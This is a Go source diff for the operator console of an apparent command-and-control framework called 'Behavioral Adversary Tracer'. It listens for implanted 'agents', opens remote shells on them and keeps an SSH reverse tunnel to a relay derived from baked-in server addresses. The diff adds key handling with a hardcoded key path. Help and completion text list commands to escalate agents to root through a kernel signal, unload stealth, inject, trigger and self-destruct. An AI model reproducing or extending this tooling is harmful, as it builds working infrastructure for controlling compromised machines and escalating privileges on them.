@@ -11,6 +11,7 @@ import (
 	"os/signal"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -20,7 +21,7 @@ import (
 	"core/mon/internal/server"
 )
 
-// ── ANSI palette ────────────────────────────────────────────────────────────
+//  ANSI palette                                                            
 const (
 	clrReset = "\033[0m"
 	clrBold  = "\033[1m"
@@ -30,7 +31,7 @@ const (
 	clrBoldW = "\033[1;97m" // bold bright white
 )
 
-// ── Banner art ───────────────────────────────────────────────────────────────
+//  Banner art                                                              
 
 // iconArt is the project silhouette (do not alter dimensions).
 const iconArt = `                          .
@@ -57,7 +58,7 @@ const wordArt = `'||''|.       |     |''||''|
  ||    ||  .''''|.     ||
 .||...|'  .|.  .||.   .||. `
 
-// ── Secret reveal ─────────────────────────────────────────────────────────────
+//  Secret reveal                                                            
 
 type secretState struct {
 	secret string
@@ -74,12 +75,12 @@ func (s *secretState) OnChange(line []rune, pos int, key rune) ([]rune, int, boo
 	return line, pos, true
 }
 
-// ── Banner ────────────────────────────────────────────────────────────────────
+//  Banner                                                                    
 
-func printBanner(out io.Writer, listenAddr, secret string) {
+func printBanner(out io.Writer, listenAddr, secret, keyPath string) {
 	const termWidth = 102
 
-	// ── Icon art centered ─────────────────────────────────────────────────────
+	//  Icon art centered                                                    
 	iconLines := strings.Split(iconArt, "\n")
 	maxIcon := 0
 	for _, l := range iconLines {
@@ -102,7 +103,7 @@ func printBanner(out io.Writer, listenAddr, secret string) {
 		}
 	}
 
-	// ── BAT wordart centered ──────────────────────────────────────────────────
+	//  BAT wordart centered                                                  
 	wordLines := strings.Split(wordArt, "\n")
 	maxWord := 0
 	for _, l := range wordLines {
@@ -121,7 +122,7 @@ func printBanner(out io.Writer, listenAddr, secret string) {
 		fmt.Fprintf(out, "%s%s\n", wordPrefix, l)
 	}
 
-	// ── Title + signature centered ────────────────────────────────────────────
+	//  Title + signature centered                                            
 	const (
 		toolName = "Behavioral Adversary Tracer"
 		version  = "v1.48"
@@ -145,7 +146,7 @@ func printBanner(out io.Writer, listenAddr, secret string) {
 		strings.Repeat(" ", sigPad),
 		clrGray, sig, clrReset)
 
-	// ── Info section ──────────────────────────────────────────────────────────
+	//  Info section                                                          
 	relayHost, c2Port, kccPort := "", "9443", "9444"
 	if config.KCCAddr != "" {
 		if h, p, err := net.SplitHostPort(config.KCCAddr); err == nil {
@@ -180,6 +181,9 @@ func printBanner(out io.Writer, listenAddr, secret string) {
 		fmt.Fprintf(out, "  %s%s\n", lbl("   ├ kcc   "), val(":"+kccPort))
 		fmt.Fprintf(out, "  %s%s\n", lbl("   └ shell "), val(":4445"))
 	}
+	if keyPath != "" {
+		fmt.Fprintf(out, "  %s      %s\n", lbl("key"), val(keyPath))
+	}
 	fmt.Fprintf(out, "  %s   %s   %s\n",
 		lbl("secret"), secretSnip, clrGray+"^H"+clrReset)
 	fmt.Fprintln(out)
@@ -197,10 +201,40 @@ func stdinIsTTY() bool {
 	return strings.HasPrefix(target, "/dev/pts/") || strings.HasPrefix(target, "/dev/tty")
 }
 
-// ── Tunnel ────────────────────────────────────────────────────────────────────
+//  Tunnel state                                                            
+
+type tunnelState struct {
+	mu    sync.Mutex
+	relay string
+	key   string
+	cmd   *exec.Cmd
+}
+
+func (t *tunnelState) start() {
+	if t.relay == "" || t.key == "" {
+		return
+	}
+	t.cmd = startTunnel(t.relay, t.key)
+}
+
+func (t *tunnelState) stop() {
+	if t.cmd != nil && t.cmd.Process != nil {
+		t.cmd.Process.Kill()
+		t.cmd.Wait()
+		t.cmd = nil
+		fmt.Fprintln(os.Stderr, "[tunnel] stopped")
+	}
+}
+
+func (t *tunnelState) restart() {
+	t.stop()
+	t.start()
+}
+
+//  Tunnel                                                                    
 
 // startTunnel launches the SSH reverse tunnel (batrev) to the relay.
-// relay: SSH target, e.g. "ubuntu@1.2.3.4" or "ubuntu@relay.example.com"
+// relay: SSH target, e.g. "ubuntu@__RELAY_IP__" or "ubuntu@relay.example.com"
 // key:   path to SSH private key
 // Returns the child process; caller is responsible for killing it on exit.
 func startTunnel(relay, key string) *exec.Cmd {
@@ -233,36 +267,54 @@ func startTunnel(relay, key string) *exec.Cmd {
 	return cmd
 }
 
-// ── main ──────────────────────────────────────────────────────────────────────
+//  main                                                                      
 
 func main() {
 	listenAddr := flag.String("listen", "0.0.0.0:9443", "listen address (host:port)")
-	relayArg := flag.String("relay", "", "SSH relay target, e.g. ubuntu@relay.example.com (starts tunnel automatically)")
-	keyArg := flag.String("key", "", "SSH key path for tunnel (default: $BAT_KEY or ~/.ssh/id_rsa)")
+	relayArg := flag.String("relay", "", "SSH relay target override, e.g. ubuntu@relay.example.com")
+	keyArg := flag.String("key", "", "SSH key path override (default: $BAT_KEY or /k/ubu2.pem)")
 	flag.Parse()
 
 	secret := config.SharedSecret
 	srv := server.New(secret)
 
-	// ── Auto-tunnel ───────────────────────────────────────────────────────────
-	var tunnelCmd *exec.Cmd
-	if *relayArg != "" {
-		sshKey := *keyArg
-		if sshKey == "" {
-			sshKey = os.Getenv("BAT_KEY")
+	//  Derive relay + key                                                    
+	relayTarget := *relayArg
+	if relayTarget == "" {
+		// auto-derive from baked config
+		relayHost := ""
+		if config.KCCAddr != "" {
+			if h, _, err := net.SplitHostPort(config.KCCAddr); err == nil {
+				relayHost = h
+			}
 		}
-		if sshKey == "" {
-			sshKey = os.Getenv("HOME") + "/.ssh/id_rsa"
+		if relayHost == "" && config.FallbackServer != "" {
+			if h, _, err := net.SplitHostPort(config.FallbackServer); err == nil {
+				relayHost = h
+			}
 		}
-		tunnelCmd = startTunnel(*relayArg, sshKey)
+		if relayHost == "" && config.DefaultServer != "" {
+			if h, _, err := net.SplitHostPort(config.DefaultServer); err == nil {
+				relayHost = h
+			}
+		}
+		if relayHost != "" {
+			relayTarget = "ubuntu@" + relayHost
+		}
 	}
 
-	stopTunnel := func() {
-		if tunnelCmd != nil && tunnelCmd.Process != nil {
-			tunnelCmd.Process.Kill()
-			tunnelCmd.Wait()
-			fmt.Fprintln(os.Stderr, "[tunnel] stopped")
-		}
+	sshKey := *keyArg
+	if sshKey == "" {
+		sshKey = config.SSHKey
+	}
+	if sshKey == "" {
+		sshKey = os.Getenv("BAT_KEY")
+	}
+
+	//  Auto-tunnel                                                          
+	tun := &tunnelState{relay: relayTarget, key: sshKey}
+	if relayTarget != "" {
+		tun.start()
 	}
 
 	// Tear down tunnel on signal.
@@ -270,7 +322,7 @@ func main() {
 	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
 	go func() {
 		<-sigCh
-		stopTunnel()
+		tun.stop()
 		os.Exit(0)
 	}()
 
@@ -278,7 +330,7 @@ func main() {
 		if err := srv.ListenAndServeTLS(*listenAddr); err != nil {
 			if !strings.Contains(err.Error(), "use of closed") {
 				fmt.Fprintf(os.Stderr, "[fatal] %v\n", err)
-				stopTunnel()
+				tun.stop()
 				os.Exit(1)
 			}
 		}
@@ -308,7 +360,7 @@ func main() {
 		}
 	}()
 
-	printBanner(rl.Stdout(), *listenAddr, secret)
+	printBanner(rl.Stdout(), *listenAddr, secret, tun.key)
 	fmt.Fprint(rl.Stdout(), server.FormatAgentTable(srv.ListAgents()))
 	fmt.Fprintln(rl.Stdout())
 
@@ -324,10 +376,10 @@ func main() {
 		if line == "!exit" || line == "quit" || line == "exit" {
 			fmt.Fprintln(rl.Stdout(), "  shutting down")
 			srv.Close()
-			stopTunnel()
+			tun.stop()
 			os.Exit(0)
 		}
-		handleCommand(rl, srv, line, secret, *listenAddr)
+		handleCommand(rl, srv, line, secret, *listenAddr, tun)
 	}
 }
 
@@ -352,7 +404,7 @@ func newReadline(srv *server.Server, ss *secretState) *readline.Instance {
 	return rl
 }
 
-// ── Tab completion ────────────────────────────────────────────────────────────
+//  Tab completion                                                            
 
 type completer struct{ srv *server.Server }
 
@@ -398,7 +450,7 @@ func (c *completer) Do(line []rune, pos int) (newLine [][]rune, length int) {
 		"ls", "grep ", "results", "clear", "help", "!exit",
 		"ttp ", "pl ", "shell ", "spec ", "rename ",
 		"root ", "stealth-status ", "stealth-unload ", "compile ",
-		"mrk ", "umrk ", "rm ", "flush",
+		"mrk ", "umrk ", "rm ", "flush", "key ",
 		"inject", "trigger ", "destruct", "kill",
 	}
 	typing := ""
@@ -416,9 +468,9 @@ func (c *completer) Do(line []rune, pos int) (newLine [][]rune, length int) {
 	return nil, 0
 }
 
-// ── Command dispatch ──────────────────────────────────────────────────────────
+//  Command dispatch                                                          
 
-func handleCommand(rl *readline.Instance, srv *server.Server, line, secret, listenAddr string) {
+func handleCommand(rl *readline.Instance, srv *server.Server, line, secret, listenAddr string, tun *tunnelState) {
 	out := rl.Stdout()
 	rawParts := strings.SplitN(line, " ", 3)
 	cmd := rawParts[0]
@@ -430,7 +482,7 @@ func handleCommand(rl *readline.Instance, srv *server.Server, line, secret, list
 	case "clear":
 		// Full clear: erase screen + scrollback, then reprint banner + fresh ls.
 		fmt.Fprint(out, "\033[H\033[2J\033[3J")
-		printBanner(out, listenAddr, secret)
+		printBanner(out, listenAddr, secret, tun.key)
 		fmt.Fprint(out, server.FormatAgentTable(srv.ListAgents()))
 		fmt.Fprintln(out)
 
@@ -468,6 +520,22 @@ func handleCommand(rl *readline.Instance, srv *server.Server, line, secret, list
 	case "flush":
 		n := srv.FlushAgents()
 		fmt.Fprintf(out, "  %d agent(s) removed\n", n)
+
+	case "key":
+		if len(args) == 0 {
+			fmt.Fprintf(out, "  key: %s\n", tun.key)
+			return
+		}
+		newKey := args[0]
+		if _, err := os.Stat(newKey); err != nil {
+			fmt.Fprintf(out, "  key: file not found: %s\n", newKey)
+			return
+		}
+		tun.mu.Lock()
+		tun.key = newKey
+		tun.mu.Unlock()
+		tun.restart()
+		fmt.Fprintf(out, "  key → %s\n", newKey)
 
 	case "ttp":
 		if len(args) < 2 {
@@ -765,7 +833,7 @@ func resolveTarget(args []string, srv *server.Server) (agentID string, isAll boo
 	return srv.ResolveID(target), false, rest
 }
 
-// ── Shell session ─────────────────────────────────────────────────────────────
+//  Shell session                                                            
 
 func doShell(rl *readline.Instance, srv *server.Server, agentID, displayID string) {
 	out := rl.Stdout()
@@ -796,7 +864,7 @@ func doShell(rl *readline.Instance, srv *server.Server, agentID, displayID strin
 	defer conn.Close()
 
 	fmt.Fprintf(out, "  [shell] connected %s\n\n", conn.RemoteAddr())
-	// Shell prompt: gray "displayID# " — all visible chars in one gray block avoids
+	// Shell prompt: gray "displayID# "   all visible chars in one gray block avoids
 	// readline width miscalculation that caused # to flicker when typing.
 	rl.SetPrompt("\x01" + clrGray + "\x02" + displayID + "# \x01" + clrReset + "\x02")
 
@@ -827,7 +895,7 @@ done:
 	fmt.Fprintln(out, "\n  [shell] ended")
 }
 
-// ── Help ──────────────────────────────────────────────────────────────────────
+//  Help                                                                      
 
 const helpText = `
   NAVIGATION
@@ -850,6 +918,7 @@ const helpText = `
     mrk @id / umrk @id          pin / unpin in ls
     rm @id                      remove agent from list (reappears on next check-in)
     flush                       remove all agents from list
+    key [/path]                 show or update SSH key path (restarts tunnel)
 
   K-SERIES
     root @id                    K-03: escalate uid→0 (signal 59)
